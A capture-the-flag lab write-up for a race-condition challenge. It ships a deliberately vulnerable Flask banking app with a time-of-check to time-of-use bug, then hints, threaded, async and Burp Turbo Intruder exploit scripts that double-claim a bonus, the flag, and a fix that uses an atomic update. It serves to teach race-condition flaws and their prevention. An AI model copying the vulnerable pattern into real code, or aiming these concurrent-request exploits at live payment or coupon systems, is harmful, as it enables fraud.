# Challenge 08 - Race Condition

**Category:** Web
**Difficulty:** Intermediate
**Points:** 300
**Target:** Custom Web Application

## Challenge Description

A web application has a "limited time offer" feature where users can claim a $100 bonus only once. The developers implemented a check to prevent double-claiming, but they made a critical mistake with their timing.

Your mission is to exploit the race condition vulnerability to claim the bonus multiple times and accumulate enough balance to "purchase" the flag.

## Objectives

- Understand race condition vulnerabilities
- Learn to exploit TOCTOU (Time-of-Check to Time-of-Use) bugs
- Use concurrent requests to exploit timing windows
- Understand database transaction isolation levels

## Target Information

- **URL:** http://localhost:8889
- **Application:** Banking simulation with race condition
- **Starting Balance:** $0
- **Bonus Amount:** $100 (should be claimed only once)
- **Flag Cost:** $500

## Getting Started

1. Create the vulnerable application:

```python
#!/usr/bin/env python3
"""Vulnerable Banking Application - Race Condition Challenge"""

from flask import Flask, request, session, jsonify, render_template_string
import sqlite3
import time
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

def init_db():
    conn = sqlite3.connect('bank.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, balance REAL, bonus_claimed INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions
                 (id INTEGER PRIMARY KEY, user_id INTEGER, amount REAL, type TEXT, timestamp REAL)''')
    conn.commit()
    conn.close()

def get_user(username):
    conn = sqlite3.connect('bank.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE username = ?', (username,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(username):
    conn = sqlite3.connect('bank.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO users (username, balance, bonus_claimed) VALUES (?, 0, 0)', (username,))
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head><title>VulnBank - Race Condition Challenge</title></head>
    <body>
        <h1>VulnBank</h1>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Username">
            <button type="submit">Login/Register</button>
        </form>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    create_user(username)
    session['username'] = username
    return jsonify({'status': 'success', 'message': f'Logged in as {username}'})

@app.route('/balance')
def balance():
    username = session.get('username')
    if not username:
        return jsonify({'error': 'Not logged in'}), 401
    user = get_user(username)
    return jsonify({
        'username': username,
        'balance': user[2],
        'bonus_claimed': bool(user[3])
    })

@app.route('/claim-bonus', methods=['POST'])
def claim_bonus():
    """VULNERABLE: Race condition in bonus claiming"""
    username = session.get('username')
    if not username:
        return jsonify({'error': 'Not logged in'}), 401

    conn = sqlite3.connect('bank.db')
    c = conn.cursor()

    # Check if bonus already claimed (TIME OF CHECK)
    c.execute('SELECT bonus_claimed FROM users WHERE username = ?', (username,))
    result = c.fetchone()

    if result[0] == 1:
        conn.close()
        return jsonify({'error': 'Bonus already claimed'}), 400

    # Simulate some processing time (makes race easier to exploit)
    time.sleep(0.1)

    # Update balance and mark as claimed (TIME OF USE)
    c.execute('UPDATE users SET balance = balance + 100, bonus_claimed = 1 WHERE username = ?', (username,))
    conn.commit()
    conn.close()

    return jsonify({'status': 'success', 'message': 'Bonus of $100 claimed!'})

@app.route('/buy-flag', methods=['POST'])
def buy_flag():
    username = session.get('username')
    if not username:
        return jsonify({'error': 'Not logged in'}), 401

    user = get_user(username)
    if user[2] >= 500:
        conn = sqlite3.connect('bank.db')
        c = conn.cursor()
        c.execute('UPDATE users SET balance = balance - 500 WHERE username = ?', (username,))
        conn.commit()
        conn.close()
        return jsonify({'flag': 'FLAG{r4c3_c0nd1t10n_t0_th3_b4nk}'})
    else:
        return jsonify({'error': f'Insufficient balance. You have ${user[2]}, need $500'}), 400

@app.route('/reset')
def reset():
    """Reset database for testing"""
    conn = sqlite3.connect('bank.db')
    c = conn.cursor()
    c.execute('DELETE FROM users')
    c.execute('DELETE FROM transactions')
    conn.commit()
    conn.close()
    return jsonify({'status': 'Database reset'})

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8889, threaded=True)
```

2. Run the application:
   ```bash
   pip install flask
   python vulnerable_bank.py
   ```

---

## Hints

<details>
<summary>Hint 1 (Cost: -30 points)</summary>

A race condition occurs when multiple operations happen simultaneously, and the outcome depends on timing.

The bonus claiming has two steps:
1. CHECK: Is bonus already claimed?
2. USE: Add $100 and mark as claimed

If you send many requests at the same time, some might pass the CHECK before any have completed the USE step!

</details>

<details>
<summary>Hint 2 (Cost: -40 points)</summary>

To exploit race conditions, you need to send multiple concurrent requests. Tools that can help:

1. **Burp Suite Turbo Intruder**: Best for precise timing
2. **Python with threading/asyncio**: Multiple simultaneous requests
3. **curl with &**: Background multiple curl processes

Try sending 10+ requests to `/claim-bonus` at exactly the same time.

</details>

<details>
<summary>Hint 3 (Cost: -60 points)</summary>

Python exploit with threading:
```python
import requests
import threading

session = requests.Session()
session.post('http://localhost:8889/login', data={'username': 'hacker'})

def claim():
    r = session.post('http://localhost:8889/claim-bonus')
    print(r.json())

threads = [threading.Thread(target=claim) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

print(session.get('http://localhost:8889/balance').json())
```

If your balance is > $100, you successfully exploited the race condition!

</details>

---

## Solution Walkthrough

<details>
<summary>Click to reveal full solution</summary>

### Step 1: Understand the Vulnerability

The `/claim-bonus` endpoint has a classic TOCTOU vulnerability:

```python
# TIME OF CHECK - Is bonus claimed?
c.execute('SELECT bonus_claimed FROM users WHERE username = ?', (username,))
if result[0] == 1:
    return error

# DELAY - Processing time creates a window
time.sleep(0.1)

# TIME OF USE - Actually claim the bonus
c.execute('UPDATE users SET balance = balance + 100, bonus_claimed = 1 WHERE username = ?', (username,))
```

The 0.1 second delay between check and use creates an exploitable window.

### Step 2: Create Test Account

```bash
# Login/create account
curl -c cookies.txt -X POST http://localhost:8889/login -d "username=hacker"

# Check initial balance
curl -b cookies.txt http://localhost:8889/balance
# {"balance": 0, "bonus_claimed": false}
```

### Step 3: Exploit with Python Threading

```python
#!/usr/bin/env python3
"""Race Condition Exploit - Claim Bonus Multiple Times"""

import requests
import threading
import time

TARGET = "http://localhost:8889"
NUM_THREADS = 50  # More threads = higher success rate

def exploit():
    # Create a session (maintains cookies)
    session = requests.Session()

    # Login
    session.post(f"{TARGET}/login", data={"username": f"hacker_{time.time()}"})

    # Check initial balance
    initial = session.get(f"{TARGET}/balance").json()
    print(f"[*] Initial balance: ${initial['balance']}")

    # Prepare concurrent requests
    results = []

    def claim_bonus():
        try:
            r = session.post(f"{TARGET}/claim-bonus")
            results.append(r.json())
        except Exception as e:
            results.append({"error": str(e)})

    # Launch all threads simultaneously
    threads = [threading.Thread(target=claim_bonus) for _ in range(NUM_THREADS)]

    print(f"[*] Launching {NUM_THREADS} concurrent requests...")

    # Start all threads at the same time
    for t in threads:
        t.start()

    # Wait for all to complete
    for t in threads:
        t.join()

    # Count successes
    successes = sum(1 for r in results if r.get('status') == 'success')
    print(f"[+] Successful claims: {successes}")

    # Check final balance
    final = session.get(f"{TARGET}/balance").json()
    print(f"[+] Final balance: ${final['balance']}")

    # Try to buy the flag
    if final['balance'] >= 500:
        flag_response = session.post(f"{TARGET}/buy-flag")
        print(f"[+] FLAG: {flag_response.json()}")
    else:
        print(f"[-] Need ${500 - final['balance']} more. Run again!")

    return session, final['balance']

if __name__ == '__main__':
    total_balance = 0
    session = None

    while total_balance < 500:
        session, total_balance = exploit()
        if total_balance < 500:
            print(f"\n[*] Retrying with same session...")
            # Reset for retry
            requests.get(f"{TARGET}/reset")
```

### Step 4: Alternative - Burp Suite Turbo Intruder

1. Capture the `/claim-bonus` request in Burp Suite
2. Send to Turbo Intruder
3. Use this script:

```python
# Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=1,
                          pipeline=False)

    for i in range(50):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)
```

### Step 5: Alternative - Async Python

```python
#!/usr/bin/env python3
"""Async Race Condition Exploit"""

import asyncio
import aiohttp

TARGET = "http://localhost:8889"

async def claim_bonus(session):
    async with session.post(f"{TARGET}/claim-bonus") as resp:
        return await resp.json()

async def exploit():
    async with aiohttp.ClientSession() as session:
        # Login
        await session.post(f"{TARGET}/login", data={"username": "async_hacker"})

        # Launch concurrent claims
        tasks = [claim_bonus(session) for _ in range(100)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        successes = sum(1 for r in results if isinstance(r, dict) and r.get('status') == 'success')
        print(f"Successful claims: {successes}")

        # Check balance
        async with session.get(f"{TARGET}/balance") as resp:
            balance = await resp.json()
            print(f"Balance: ${balance['balance']}")

        # Buy flag
        if balance['balance'] >= 500:
            async with session.post(f"{TARGET}/buy-flag") as resp:
                flag = await resp.json()
                print(f"FLAG: {flag}")

asyncio.run(exploit())
```

### Step 6: Get the Flag

After successfully exploiting the race condition multiple times:

```bash
# Check balance
curl -b cookies.txt http://localhost:8889/balance
# {"balance": 500, "bonus_claimed": true}

# Buy the flag
curl -b cookies.txt -X POST http://localhost:8889/buy-flag
# {"flag": "FLAG{r4c3_c0nd1t10n_t0_th3_b4nk}"}
```

### Understanding the Race Condition

```
Timeline without race condition:
Request 1: CHECK(not claimed) → UPDATE(claimed) → Done
Request 2: CHECK(claimed!) → Rejected

Timeline WITH race condition:
Request 1: CHECK(not claimed) ────────────────────→ UPDATE(claimed)
Request 2: CHECK(not claimed) ────────────────────→ UPDATE(claimed)
Request 3: CHECK(not claimed) ────────────────────→ UPDATE(claimed)
                              ↑ All pass because none updated yet!
```

### Race Condition Types

| Type | Description | Example |
|------|-------------|---------|
| TOCTOU | Time-of-Check to Time-of-Use | This challenge |
| Double Spend | Transaction processed twice | Payment systems |
| File Race | File operations between check and use | Symlink attacks |
| Signal Race | Signal handling timing issues | Privilege escalation |

### Prevention

```python
# SECURE: Use database transactions with proper isolation
def claim_bonus_secure(username):
    conn = sqlite3.connect('bank.db', isolation_level='EXCLUSIVE')
    conn.execute('BEGIN EXCLUSIVE')  # Lock the database

    try:
        c = conn.cursor()
        # Atomic check and update
        c.execute('''
            UPDATE users
            SET balance = balance + 100, bonus_claimed = 1
            WHERE username = ? AND bonus_claimed = 0
        ''', (username,))

        if c.rowcount == 0:
            conn.rollback()
            return {'error': 'Bonus already claimed'}

        conn.commit()
        return {'status': 'success'}
    except:
        conn.rollback()
        raise
    finally:
        conn.close()

# Alternative: Use row-level locking
# PostgreSQL: SELECT ... FOR UPDATE
# MySQL: SELECT ... FOR UPDATE
```

### Real-World Examples

1. **Coupon codes**: Apply same code multiple times
2. **Vote manipulation**: Vote multiple times for same item
3. **Inventory**: Buy more items than available stock
4. **Account balance**: Withdraw more than balance
5. **Rate limiting**: Bypass rate limits with concurrent requests

</details>

---

## Flag

```
FLAG{r4c3_c0nd1t10n_t0_th3_b4nk}
```

**Flag Format:** `FLAG{...}`

## Skills Practiced

- Race condition exploitation
- Concurrent request handling
- Python threading/asyncio
- Understanding database transactions
- Timing attack fundamentals

## Tools Used

- Python (threading, asyncio, aiohttp)
- Burp Suite Turbo Intruder
- curl
- requests library

## Related Challenges

- [Web Cache Poisoning (Intermediate)](07-web-cache-poisoning.md) - Timing-related attack
- [Multi-Stage Attack (Advanced)](../advanced/06-multi-stage-attack.md) - Complex exploitation

## References

- [OWASP Race Conditions](https://owasp.org/www-community/vulnerabilities/Race_condition)
- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)
- [Database Isolation Levels](https://en.wikipedia.org/wiki/Isolation_(database_systems))
